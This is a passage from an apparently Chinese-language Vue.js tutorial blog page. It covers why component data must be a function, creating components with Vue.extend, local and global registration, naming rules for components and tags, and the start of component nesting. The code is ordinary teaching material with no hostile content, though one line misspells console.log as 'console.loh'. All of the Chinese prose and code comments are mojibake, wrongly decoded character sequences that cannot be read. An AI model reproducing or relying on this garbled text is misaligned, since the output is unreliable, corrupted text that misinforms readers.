æœ€ç»ˆæ‰€æœ‰çš„ç»„ä»¶éƒ½è¦ç»è¿‡ä¸€ä¸ªvmçš„ç®¡ç†ï¼Œç”±vmä¸­çš„elå†³å®šæœåŠ¡å“ªä¸ªå®¹å™¨ã€‚</li><li>dataå¿…é¡»å†™æˆå‡½æ•°ï¼Œä¸ºä»€ä¹ˆï¼Ÿ â€”â€”â€”â€” é¿å…ç»„ä»¶è¢«å¤ç”¨æ—¶ï¼Œæ•°æ®å­˜åœ¨å¼•ç”¨å…³ç³»ã€‚</li></ul><p>è®²è§£ä¸€ä¸‹é¢è¯•å°é—®é¢˜ï¼šdataå¿…é¡»å†™æˆå‡½æ•°ï¼š</p><p>è¿™æ˜¯ js åº•å±‚è®¾è®¡çš„åŸå› ï¼šä¸¾ä¸ªä¾‹å­</p><blockquote><p>å¯¹è±¡å½¢å¼</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> data = &#123;<br>    <span class="hljs-attr">a</span>: <span class="hljs-number">99</span>,<br>    <span class="hljs-attr">b</span>: <span class="hljs-number">100</span><br>&#125;<br><br><span class="hljs-keyword">let</span> x = data;<br><span class="hljs-keyword">let</span> y = data;<br><span class="hljs-comment">// x å’Œ y å¼•ç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œä¿®æ”¹ x çš„å€¼ï¼Œ y çš„å€¼ä¹Ÿä¼šæ”¹å˜</span><br>x.<span class="hljs-property">a</span> = <span class="hljs-number">66</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">loh</span>(x); <span class="hljs-comment">// a:66 b:100</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y); <span class="hljs-comment">// a:66 b:100</span><br></code></pre></td></tr></table></figure><blockquote><p>å‡½æ•°å½¢å¼</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">a</span>: <span class="hljs-number">99</span>,<br>        <span class="hljs-attr">b</span>: <span class="hljs-number">100</span><br>    &#125;<br>&#125;<br><span class="hljs-keyword">let</span> x = <span class="hljs-title function_">data</span>();<br><span class="hljs-keyword">let</span> y = <span class="hljs-title function_">data</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x === y); <span class="hljs-comment">// false</span><br><span class="hljs-comment">// æˆ‘çš„ç†è§£æ˜¯å‡½æ•°æ¯è°ƒç”¨ä¸€æ¬¡å°±åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡è¿”å›ç»™ä»–ä»¬</span><br></code></pre></td></tr></table></figure><blockquote><p>å¤‡æ³¨ï¼šä½¿ç”¨templateå¯ä»¥é…ç½®ç»„ä»¶ç»“æ„ã€‚</p></blockquote><p>åˆ›å»ºä¸€ä¸ªç»„ä»¶æ¡ˆä¾‹ï¼šVue.extend() åˆ›å»º</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">    Vue.config.productionTip = false</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">    //ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºschoolç»„ä»¶</span></span><br><span class="language-xml"><span class="language-handlebars">    const school = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">        template:`</span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡åç§°ï¼š</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">schoolName</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡åœ°å€ï¼š</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">address</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showName&quot;</span>&gt;</span>ç‚¹æˆ‘æç¤ºå­¦æ ¡å<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">`,</span></span><br><span class="language-xml"><span class="language-handlebars">        // el:&#x27;#root&#x27;, //ç»„ä»¶å®šä¹‰æ—¶ï¼Œä¸€å®šä¸è¦å†™elé…ç½®é¡¹ï¼Œå› ä¸ºæœ€ç»ˆæ‰€æœ‰çš„ç»„ä»¶éƒ½è¦è¢«ä¸€ä¸ªvmç®¡ç†ï¼Œç”±vmå†³å®šæœåŠ¡äºå“ªä¸ªå®¹å™¨ã€‚</span></span><br><span class="language-xml"><span class="language-handlebars">        data()&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            return &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">                schoolName:&#x27;å°šç¡…è°·&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">                address:&#x27;åŒ—äº¬æ˜Œå¹³&#x27;</span></span><br><span class="language-xml"><span class="language-handlebars">            &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;,</span></span><br><span class="language-xml"><span class="language-handlebars">        methods: &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            showName()&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">                alert(this.schoolName)</span></span><br><span class="language-xml"><span class="language-handlebars">            &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;,</span></span><br><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">    //ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºstudentç»„ä»¶</span></span><br><span class="language-xml"><span class="language-handlebars">    const student = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">        template:`</span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦ç”Ÿå§“åï¼š</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">studentName</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦ç”Ÿå¹´é¾„ï¼š</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">age</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">`,</span></span><br><span class="language-xml"><span class="language-handlebars">        data()&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            return &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">                studentName:&#x27;å¼ ä¸‰&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">                age:18</span></span><br><span class="language-xml"><span class="language-handlebars">            &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">    //ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºhelloç»„ä»¶</span></span><br><span class="language-xml"><span class="language-handlebars">    const hello = Vue.extend(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">        template:`</span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ä½ å¥½å•Šï¼</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">`,</span></span><br><span class="language-xml"><span class="language-handlebars">        data()&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">            return &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">                name:&#x27;Tom&#x27;</span></span><br><span class="language-xml"><span class="language-handlebars">            &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>æ³¨å†Œç»„ä»¶</strong></p><ul><li>å±€éƒ¨æ³¨å†Œï¼šé new Vueçš„æ—¶å€™ä¼ å…¥componentsé€‰é¡¹</li><li>å…¨å±€æ³¨å†Œï¼šé Vue.component(â€˜ç»„ä»¶åâ€™,ç»„ä»¶)</li></ul><blockquote><p>å±€éƒ¨æ³¨å†Œ</p></blockquote><pre><code class="hljs">&lt;script&gt;    //åˆ›å»ºvm    new Vue(&#123;        el: &#39;#root&#39;,        data: &#123;            msg:&#39;ä½ å¥½å•Šï¼&#39;        &#125;,        //ç¬¬äºŒæ­¥ï¼šæ³¨å†Œç»„ä»¶ï¼ˆå±€éƒ¨æ³¨å†Œï¼‰        components: &#123;            school: school,            student: student            // ES6ç®€å†™å½¢å¼            // school,            // student        &#125;    &#125;)&lt;/script&gt;</code></pre><blockquote><p>å…¨å±€æ³¨å†Œ</p></blockquote><pre><code class="hljs">&lt;script&gt;    //ç¬¬äºŒæ­¥ï¼šå…¨å±€æ³¨å†Œç»„ä»¶    Vue.component(&#39;hello&#39;, hello)&lt;/script&gt;</code></pre><p><strong>å†™ç»„ä»¶æ ‡ç­¾</strong></p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hello</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hello</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- ç¬¬ä¸‰æ­¥ï¼šç¼–å†™ç»„ä»¶æ ‡ç­¾ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">school</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">school</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- ç¬¬ä¸‰æ­¥ï¼šç¼–å†™ç»„ä»¶æ ‡ç­¾ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">student</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>å…¨éƒ¨ä»£ç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">school</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">school</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hello</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hello</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hello</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hello</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>      <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root1&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- &lt;student&gt;&lt;/student&gt; --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> school = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">extend</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">template</span>: <span class="hljs-string">`&lt;div class=&quot;demo&quot;&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;h2&gt;å­¦æ ¡åç§°ï¼š&#123;&#123;schoolName&#125;&#125;&lt;/h2&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;h2&gt;å­¦æ ¡åœ°å€ï¼š&#123;&#123;address&#125;&#125;&lt;/h2&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;button @click=&quot;showName&quot;&gt;ç‚¹æˆ‘æç¤ºå­¦æ ¡å&lt;/button&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">    &lt;/div&gt;`</span>,</span><br><span class="language-javascript">            <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">schoolName</span>: <span class="hljs-string">&#x27;å®¶é‡Œè¹²å¤§å­¦&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">address</span>: <span class="hljs-string">&#x27;china&#x27;</span></span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">showName</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>)</span><br><span class="language-javascript">                    <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">schoolName</span>)</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> student = &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">template</span>: <span class="hljs-string">`</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;div&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;h2&gt;å­¦ç”Ÿå§“åï¼š&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;h2&gt;å­¦ç”Ÿå¹´é¾„ï¼š&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">    &lt;/div&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">`</span>,</span><br><span class="language-javascript">            <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;xyy&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">age</span>: <span class="hljs-number">18</span></span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-comment">//ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºhelloç»„ä»¶</span></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> hello = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">extend</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">template</span>: <span class="hljs-string">`</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;div&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;h3&gt;ä½ å¥½å•Šï¼&#123;&#123;name&#125;&#125;&lt;/h3&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">  &lt;/div&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">`</span>,</span><br><span class="language-javascript">            <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;cess&#x27;</span></span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-comment">//ç¬¬äºŒæ­¥ï¼šå…¨å±€æ³¨å†Œç»„ä»¶</span></span><br><span class="language-javascript">        <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;hello&#x27;</span>, hello)</span><br><span class="language-javascript">        <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;student&#x27;</span>, student)</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> v1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-comment">// name:&#x27;ä¸ä¼šæ•²ä»£ç ï¼&#x27;</span></span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">                school,</span><br><span class="language-javascript">                <span class="hljs-comment">// student</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> v2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root1&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;ä¸ä¼šæ•²ä»£ç ï¼&#x27;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="å‡ ä¸ªæ³¨æ„ç‚¹-ï¼š"><a href="#å‡ ä¸ªæ³¨æ„ç‚¹-ï¼š" class="headerlink" title="å‡ ä¸ªæ³¨æ„ç‚¹ ï¼š"></a><strong>å‡ ä¸ªæ³¨æ„ç‚¹ ï¼š</strong></h4><p>å…³äºç»„ä»¶åï¼š</p><p>ä¸€ä¸ªå•è¯ç»„æˆï¼š</p><ul><li>ç¬¬ä¸€ç§å†™æ³•(é¦–å­—æ¯å°å†™)ï¼šschool</li><li>ç¬¬äºŒç§å†™æ³•(é¦–å­—æ¯å¤§å†™)ï¼šSchool</li></ul><p>å¤šä¸ªå•è¯ç»„æˆï¼š</p><ul><li>ç¬¬ä¸€ç§å†™æ³•(kebab-caseå‘½å)ï¼šmy-school</li><li>ç¬¬äºŒç§å†™æ³•(CamelCaseå‘½å)ï¼šMySchool (éœ€è¦Vueè„šæ‰‹æ¶æ”¯æŒ)</li></ul><blockquote><p>å¤‡æ³¨ï¼š</p><p>(1).ç»„ä»¶åå°½å¯èƒ½å›é¿HTMLä¸­å·²æœ‰çš„å…ƒç´ åç§°ï¼Œä¾‹å¦‚ï¼šh2ã€H2éƒ½ä¸è¡Œã€‚</p><p>(2).å¯ä»¥ä½¿ç”¨nameé…ç½®é¡¹æŒ‡å®šç»„ä»¶åœ¨å¼€å‘è€…å·¥å…·ä¸­å‘ˆç°çš„åå­—ã€‚</p></blockquote><p>å…³äºç»„ä»¶æ ‡ç­¾:</p><ul><li><p>ç¬¬ä¸€ç§å†™æ³•ï¼š<school></school></p></li><li><p>ç¬¬äºŒç§å†™æ³•ï¼š<school/>ï¼ˆéœ€è¦Vueè„šæ‰‹æ¶æ”¯æŒï¼‰</p></li></ul><blockquote><p>å¤‡æ³¨ï¼šä¸ä½¿ç”¨è„šæ‰‹æ¶æ—¶ï¼Œ<school/>ä¼šå¯¼è‡´åç»­ç»„ä»¶ä¸èƒ½æ¸²æŸ“</p></blockquote><p>ä¸€ä¸ªç®€å†™æ–¹å¼ï¼šconst school &#x3D; Vue.extend(options)å¯ç®€å†™ä¸ºconst school &#x3D; optionsï¼Œå› ä¸ºçˆ¶ç»„ä»¶componentså¼•å…¥çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆ›å»º</p><blockquote><p>å¤‡æ³¨:ä½¿ç”¨ç»„ä»¶æ ‡ç­¾å¾—æ—¶å€™ä¸€å®šè¦æ”¾å…¥è¢«Vueç®¡ç†çš„DOMä¸­å»</p></blockquote><h3 id="ç»„ä»¶çš„åµŒå¥—"><a href="#ç»„ä»¶çš„åµŒå¥—" class="headerlink" title="ç»„ä»¶çš„åµŒå¥—"></a>ç»„ä»¶çš„åµŒå¥—</h3><p>æ¯”è¾ƒç®€å•ï¼Œç›´æ¥å±•ç¤ºä»£ç ï¼š</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ç»„ä»¶çš„åµŒå¥—<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">  Vue.config.productionTip = false</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">  //å®šä¹‰studentç»„ä»¶</span></span><br><span 